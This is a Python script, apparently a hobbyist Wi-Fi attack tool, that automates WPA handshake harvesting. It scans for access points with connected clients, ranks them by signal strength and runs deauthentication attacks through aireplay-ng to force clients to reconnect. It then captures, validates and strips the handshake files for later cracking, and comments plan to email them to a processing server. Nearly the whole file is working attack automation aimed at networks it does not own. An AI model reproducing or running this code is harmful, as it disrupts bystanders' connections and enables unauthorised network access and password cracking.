#!/usr/bin/python

import time
import subprocess
import os
import signal
import operator
import glob
import xml.etree.cElementTree as ET
from subprocess import Popen, call, PIPE
from signal import SIGINT, SIGTERM
from multiprocessing import Process, Pipe
from validate import validator
from scanner import scanner
from watchdog.events import PatternMatchingEventHandler  
from watchdog.observers import Observer
from xml_arse import xml_machine

####improvements:
####
###Add commenting
##
#
##create temp folders automatically and clean up when finished
#
#Report on make/model of attached clients
#
#Add some verbose debug reporting functionality
#
##Detect interface that is in monitor mode/check
#
##Add args feature to alter things like scan time for initial general scan loop
#
#"ignore list of previous APs" should be selectable at cmd line avriable

#Dev null variable for subprocesses
DN = open(os.devnull, 'w')
#wifi interface that is in monitor mode
iface = 'wlan1mon'
#file locations 
##These should be improved to be located in temp files and then cleaned up afterwards
target_dir = '/home/odroid/targets/'
output_dir = '/home/odroid/xmls/'
handshake_dir = '/home/odroid/hs/'
cracked_dir = 'home/odroid/cracked/'

class MyHandler(PatternMatchingEventHandler):
	
	patterns = ["*.xml", "*.netxml"]

##This needs to be improved to tolerate empty/bad xmls...
	def process(self, event):
		#print "Path =", event.src_path					#debug
		#print event.src_path, event.event_type			#debug
		time.sleep(0.1)
		w_xml = xml_machine('%s' % event.src_path)
		crackable_list = w_xml.crackables()
		#print "crackable_list:", crackable_list		#debug
		if crackable_list == '0':
			print "no luck buddy, keep trying"
		else:
			print "Potential target WIFI AP(s) detected..."
			for cracker in crackable_list:
				print "cracker:", cracker
				w_xml.parse_deets(cracker)
#create/check list of APs that have already been cracked/timed-out and also add any manual exceptions
#manual exceptions should be able to be cmd line variables
				ignore_aps = create_ignore_list()
				if w_xml.name != 'none':
					if w_xml.name not in ignore_aps: 	##ignore this AP
						if w_xml.client_count != 0:
							#print "client_count:", deets["client_count"]   #debug
							w_xml.xml_tree()
							w_xml.xml_write(target_dir+cracker+'.xml')
						else:
							print "No suitable WIFI AP(s) detected, continuing to scan..."	

	def on_modified(self, event):
		#print "modified observer =", observer
		#print event.src_path
		#time.sleep(1)
		if os.path.exists(event.src_path):
			self.process(event)


def tidy():
#Housekeeping function to remove old files	
	print "Housekeeping..."
	files_xml = os.listdir(output_dir)
	print "removing existing xml files:", files_xml
	for file in  files_xml:
		try:
			os.remove(output_dir+file)        
		except OSError:
			pass
	files_targets = os.listdir(target_dir)
	for file in files_targets:
#test for "self.cracked == False"
		remove_xml = xml_machine(target_dir+file)
		remove_xml.parse_deets()
		#print "remove_xml.cracked:", remove_xml.cracked    			#debug
		if str(remove_xml.cracked) == 'False':
			try:
				print "Removing target xml file:", (target_dir+file)
				os.remove(target_dir+file)   
			except OSError:
				pass
	files_handshake = os.listdir(handshake_dir)
	for file in  files_handshake:
		#test for filename without word "strip" in it 
		file_string = str(file)
		strip_test = file_string.find("strip")
		if strip_test == -1:
			try:
				print "removing useless handshake file:", (handshake_dir+file)
				os.remove(handshake_dir+file)        
			except OSError:
				pass

def sort_by_power(location):
#looks at folder of xmls and sorts APs based on "last_max_signal" RF power value
	sort_dict = {}
	for sort_me in glob.iglob(location):
		print "file:", sort_me
		sorted_xml = xml_machine(sort_me)
		sorted_xml.parse_deets()
		print "name:", sorted_xml.name
		print "power:", sorted_xml.power
		sort_dict[sorted_xml.name] = str(sorted_xml.power)
		print "sort_dict:", sort_dict
	_sorted = sorted(sort_dict.items(), key=operator.itemgetter(1))
	print "sorted result:", _sorted
	return _sorted

def create_ignore_list():
	ignore_list = ['petonehappinessclub', 'SETUP']
	for ignore in glob.iglob(target_dir+"*.xml"):
		ignore_xml = xml_machine(ignore)
		ignore_xml.parse_deets()
		if str(ignore_xml.cracked) != 'False':
			ignore_list.append(ignore_xml.name)
	print "ignore_list:", ignore_list		
	return ignore_list

if __name__ == '__main__':
	try:
		while True:
			tidy()
			print "Creating general scanner object"
			g_scanner = scanner(iface)
			#print "g_scanner:", g_scanner					#debug
			print "Creating pipe for general scan"			#Pipes for control of external application processes
			airodump_parent_conn, airodump_child_conn = Pipe()
			print "Creating process for general scan"
			airodump = Process(target=g_scanner.scan, kwargs={
			'out_format':'netxml', 
			'out_dest':output_dir, 
			'conn':airodump_child_conn,
			'interval':'20'})								#This interval should be configurable by cmd line variable
			print  "Creating process for folder watch"
			observer = Observer()							#folder watchdog process to monitor outputxml from airodump-ng
			observer.schedule(MyHandler(), path=output_dir)
			airodump.start()
			scanning = True
			time_started = time.time()
			#print "time_started:%.0f" % time_started			#debug
			print "Starting folder watchdog..."
			observer.start()
			while scanning == True:
				time.sleep(1)
				airodump_parent_conn.send(scanning)
				print "General scan now running for: %.0f seconds" % (time.time() - time_started)
				file_list = os.listdir(target_dir)
				if time.time() - time_started >= 60:
					print "Times up, aborting general scan..."	
					scanning = False
				if file_list != []:
					###test for APs that havent previously been cracked/timed-out
					for _file in file_list:
						_xml = xml_machine(target_dir+_file)
						_xml.parse_deets()
						if str(_xml.cracked) == 'False':
							print "Targets detected, aborting general scan..."
							scanning = False
							break	   
			observer.stop()		
			airodump_parent_conn.send(scanning)
			airodump_parent_conn.close()
			if file_list != []:
#parse xml exported previously with target deets
				sort_list = sort_by_power(target_dir+"*.xml")
				print "sort_list:", sort_list
				ignore_aps = create_ignore_list()
				print "ignore_aps", ignore_aps
				scan_list = [x for x in sort_list if x not in ignore_aps]
				print "scan_list:", scan_list
				for AP in scan_list:
					#print "target_dir+file:", (target_dir+file) 				#debug
					f_xml = xml_machine(target_dir+AP[0]+".xml") 
					f_xml.parse_deets()
#Test if AP has already been cracked			
					if str(f_xml.cracked) == "False":
#start airodump-ng focussed attack using deets parsed from xml
						print "Creating focussed scanner object"
						f_scanner = scanner(iface)
						#print "f_scanner:", f_scanner					#debug
						f_airodump_parent_conn, f_airodump_child_conn = Pipe()
						deauth_parent_conn, deauth_child_conn = Pipe()
						f_airodump = Process(target=f_scanner.scan, kwargs={ 
						'out_format':'pcap', 
						'out_dest':handshake_dir, 
						'channel':f_xml.channel,
						'conn':f_airodump_child_conn,
						'essid':f_xml.name})
						f_deauth = Process(target=f_scanner.deauth, kwargs={ 
						'essid':f_xml.name,
						'bssid':f_xml.bssid,
						'client_MAC':(f_xml.client_list),	#expects a list
						'conn':deauth_child_conn})
	#start airodump-ng process - focussed this time. Captures any 4 way hadnshakes.
						f_airodump.start()
	#start aireplay-ng process with deauth method. Deauths clients to force handshaking procedure.
						f_deauth.start()
						time_started = time.time()
						f_scanning = True
						while f_scanning == True:
							f_airodump_parent_conn.send(f_scanning)
							deauth_parent_conn.send(f_scanning)
							deauth = deauth_parent_conn.recv()
							time.sleep(10)
							if deauth == True:
								files_handshake = os.listdir(handshake_dir)
								for files in files_handshake:		
	##scan pcap file for valid handshake EAPOL packets
									handshake_file = (handshake_dir+files)
									if handshake_file == (handshake_dir+f_xml.name+"_scan-01.cap"):     
										valid = validator(SSID=(f_xml.name), 
										BSSID=(f_xml.bssid), 
										capfile=handshake_file)
										print "Validation result of handshake capture:", valid.validation_result
										print "Analysis result of handshake capture:", valid.analyze_result
	#when handshake detected stop focussed attack			
										if valid.validation_result or valid.analyze_result == True:			
											print "Handshake captured, my job here is done..."	
	#take GPS position and plot name of wifi network on map
	#To be writted here.....
											f_xml.cracked = 'True'
											f_xml.xml_tree()
											f_xml.xml_write(target_dir+f_xml.name+'.xml')	
											f_scanning = False
											f_airodump_parent_conn.send(f_scanning)
											deauth_parent_conn.send(f_scanning)
											f_airodump_parent_conn.close()
											deauth_parent_conn.close()
											time.sleep(1)
	#process handshake file here: strip, analyze and validate	
											print "Stripping handshake cap file of unnecessary packets"
											valid.strip(handshake_dir+valid.SSID+'_strip.cap')
											print "Vaidating stripped cap file..."
											strip_valid = validator(SSID=(f_xml.name), 
											BSSID=(f_xml.bssid), 
											capfile=handshake_dir+valid.SSID+'_strip.cap')
											print "Validation result of stripped handshake capture:", strip_valid.validation_result
											print "Analysis result of stripped handshake capture:", strip_valid.analyze_result
											break
	#time-out in case no handshakes are captured
	##make this option (length in seconds) controllable via args???			
							if f_scanning == True:
								print "Focussed attack now running for: %.0f seconds" % (time.time() - time_started)
								if time.time() - time_started >= 30:
									print "Times up, aborting focussed attack..."
									f_xml.cracked = 'Timeout'
									print "testing here:", f_xml.cracked
									f_xml.xml_tree()
									f_xml.xml_write(target_dir+f_xml.name+'.xml')	
									f_scanning = False
									f_airodump_parent_conn.send(f_scanning)
									deauth_parent_conn.send(f_scanning)
									f_airodump_parent_conn.close()
									deauth_parent_conn.close()
									break	
					else:
						print "Ignoring cracked/timeout AP:", f_xml.name						
			else:
				print "No suitable networks detected."
			time.sleep(2)
			print "up to here..."	
	except KeyboardInterrupt:
		print "manually interrupted!"
		tidy()
#export processed handshake file and email to processing server
#return to top of loop and continue scanning...